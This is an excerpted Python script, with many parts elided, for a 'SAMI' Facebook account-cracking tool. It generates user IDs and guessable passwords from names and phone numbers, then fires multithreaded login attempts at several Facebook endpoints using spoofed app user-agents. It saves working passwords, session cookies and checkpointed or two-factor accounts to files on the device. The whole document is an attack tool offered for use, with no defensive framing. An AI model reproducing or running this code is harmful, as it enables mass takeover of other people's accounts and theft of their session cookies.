...
for ksh in range(5000):
    ...
    ua1 = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    SAMIapi.append(ua)
...
os.system("xdg-open https://www.youtube.com/@Love-stutas-vedio")
os.system("clear")
...
def menu():
    ...
    SAMIv = input("•CHOOSE> ")
    if SAMIv =='1':f_clone()
    elif SAMIv =='2':r_clone()
    elif SAMIv =='3':n_clone()
    elif SAMIv =='4':g_clone()
    elif SAMIv =='5':os.system("xdg-open https://t.me/trickerxx7");menu()
    elif SAMIv =='6':exit()
    else:
...
def f_clone():
   ...
   #print(" [1] CRACK WITH AUTO PASS ")
    ...
    if p == "1":
        ...
        clear()
        print(" [+] MAXIMUM LIMIT : (10) ")
        linex()
        plimit = int(input(" [+] ENTER PASSWORD LIMIT : "))
        clear()
        print(" [+] EXAMPLE : first123, first1234, first12345 ")
        linex()
        for SAMI in range(plimit):
            ap = input(f" [{SAMI+1}] ENTER PASSWORD : ")
            plist.append(ap)
    with ThreadPool(max_workers=30) as SAMI_xd:
        clear()
        tl = str(len(idz))
        print(" [+] TOTAL ACCOUNTS : "+tl)
        print(" [+] PROCESS HAS BEEN STARTED ")
        print(" [+] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for love in idz:
            uid, name = love.split("|")
            pwx = plist
            if m == "1":SAMI_xd.submit(freefb, uid, name, pwx, tl)
            elif m == "2":SAMI_xd.submit(bapi, uid, name, pwx, tl)
            elif m == "3":SAMI_xd.submit(graph, uid, name, pwx, tl)
            else:
                SAMI_xd.submit(graph, uid, name, pwx, tl)
    linex()
...
def SAMI1():
    ...
    with ThreadPool(max_workers=30) as SAMI_xd:
        ...
        print(f'[+] YOUR METHOD CHOOSED : M{SAMIfire}')
        ...
        for love in user:
            ...
            if SAMIfire =='1':SAMI_xd.submit(mbasic,uid,pwx,tl)
            elif SAMIfire =='2':SAMI_xd.submit(p,uid,pwx,tl)
            elif SAMIfire =='3':SAMI_xd.submit(x,uid,pwx,tl)
            elif SAMIfire =='4':SAMI_xd.submit(mobile,uid,pwx,tl)
            elif SAMIfire =='5':SAMI_xd.submit(freeq,uid,pwx,tl)
            elif SAMIfire =='6':SAMI_xd.submit(d,uid,pwx,tl)
            else:
                SAMI_xd.submit(p,uid,pwx,tl)
    linex()
    print('[•] CRACK PROCESS COMPLETE')
    print('[•] TOTAL OK ACCOUNTS : '+str(len(oks)))
    print('[•] ID SAVE SAMI-OK TXT')
    linex()
...
def n_clone():
    fresh()
    print(f" {wow('+')} ENTER NUMBER WITH COUNTRY CODE ")
    print(f" {wow('+')} EXAMPLE : {green}9351048348 ")
    divider()
    ...
    fresh()
    print(f" {wow('+')} EXAMPLE : {green}first6, last6 ")
    print(f" {wow('+')} EXAMPLE : {green}first7, last7 ")
    print(f" {wow('+')} EXAMPLE : {green}khankhan, 57273200 ")
    print(f" {wow('+')} EXAMPLE : {green}fullnumber ")
    divider()
    ...
    print(f" {wow('+')} {green}TOTAL OK : {str(len(oks))} ")
    divider()
    exit()
...
def g_clone():
    ...
    os.system('clear')
    print(logo)
    print(" Ex First : ayesha, kazim, SAMI ")
...
def freefb(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [SAMI-M1] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            'method': 'POST',
            'path': '/login/SAMIice-based/login/async/',
            'scheme': 'https',
            'content-length': '294',
            ...
            lo = session.post("https://mbasic.facebook.com/login/SAMIice-based/password/?uid=100095733750131&flow=login_no_pin&refsrc=deprecated&_rdr", data=data, headers=headers).text
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                print(f" {green}[SAMI-OK] {uid}|{pw}")
                print(f" {white}[COOKIES] {green}{coki}")
                open("/sdcard/SAMI_file_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid+"|"+pw)
                break
            elif "checkpoint" in log_cookies:
                if "Enter login code to continue" in log_cookies:
                    print(f" {cyan}[SAMI-2F] {uid}|{pw}")
                    open("/sdcard/SAMI_file_2F.txt", "a").write(f"{uid}|{pw}\n")
                    twf.append(uid+"|"+pw)
                    break
                else:
                   #print(f" {red}[SAMI-CP] {uid}|{pw}")
                    open("/sdcard/SAMI_file_cp.txt", "a").write(f"{uid}|{pw}\n")
                    cps.append(uid+"|"+pw)
                    break
            else:
                continue
...
def bapi(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [SAMI-M2] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            data = {
                ...
                'cpl': 'true',
                'try_num': '1',
                'family_SAMIice_id': str(uuid.uuid4()),
            ...
            if "session_key" in result:
                ...
                print(f" {red}[SAMI-CP] {uid}|{pw}")
                open("/sdcard/SAMI_file_tf.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                break
            else:
                continue
...
def graph(uid, name, pwx, tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [SAMI-M3] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
        ...
        for ps in pwx:
            ...
            headers = {
                ...
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-SAMIice-group': str(random.randint(2000, 4000)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
...
def mbasic(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M1-SAMI] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
                ...
                if "live" in c:
                    if result["is_account_confirmed"] == False:
                       ...
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/SAMI-novery.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                    else:
                        print(f" {green}[SAMI-OK] {uid}|{pw}")
                        print(f" {white}[COOKIES] {green}{coki}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/SAMI_random_ok.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                        oks.append(uid)
                        break
            else:
                continue
...
def p(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M2-SAMI] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def x(uid,pwx,tl):
    ...
    global cps
    global SAMIua
    sys.stdout.write('\r\33[1;37m[M3-SAMI] %s|OK:%s \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for ps in pwx:
    ...
    'viewport-width': '980',
            ...
            lo = session.post('https://x.facebook.com/login/SAMIice-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            ...
            if 'c_user' in log_cookies:
                ...
                if "live" in check_lock(cid):
                    if '%3A-1%3A-1' in coki:
                        print('\33[1;94m[SAMI-NV] '+cid+' | '+ps+'\33[0;97m')
                        break
                    else:
                        print('\33[1;92m[SAMI-OK] '+cid+' | '+ps+'\33[0;97m')
                        if "yes" in cookie_show:
                            print(f"\033[1;32mCOOKIES : {coki}")
                            open('/sdcard/SAMI-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
                            oks.append(cid)
                            break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                if "Enter login code to continue" in log_cookies:
                    #print('\33[1;94m[SAMI-2F] '+uid+' | '+ps+'\33[0;97m')
                    open('/sdcard/SAMI-2f.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                    break
                else:
                    #print('\33[1;91m[SAMI-CP] '+uid+' | '+ps+'\33[0;97m')
                    open('/sdcard/SAMI-Cp.txt', 'a').write(uid+' | '+ps+'\n')
                    cps.append(uid)
                    break
            else:
                continue
...
def mobile(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M4-SAMI] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def freeq(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M5-SAMI] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def d(uid,pwx,tl):
    ...
    global oks
    global cps
    sys.stdout.write("\r\033[1;37m [M6-SAMI] [%s] [%s/%s]\r"%(loop, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
...
def cracker(uid, pwx, tl):
    ...
    global twf
    global loop
    sys.stdout.write(f"\r {green}(SAMI) ({loop}) (OK-{len(oks)})\r"),
    sys.stdout.flush()
    try:
        first6digit = uid[0:6]
        first7digit = uid[0:7]
...
"Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]",
            ...
            if "c_user" in response:
                ...
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f" {cyan}(SAMI-2F) {cid}|{pw} ")
                        break
                    else:
                        print(f" {green}(SAMI-OK) {cid}|{pw} ")
                        print(f" {white}Cookie : {green}{coki}")
                       #print(f" {white}Cookie : {green}{coki}")
                        open("/sdcard/SAMI-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        oks.append(cid)
                        break
                else:
                    break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\33[1;91m[SAMI-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/SAMI-Cp.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
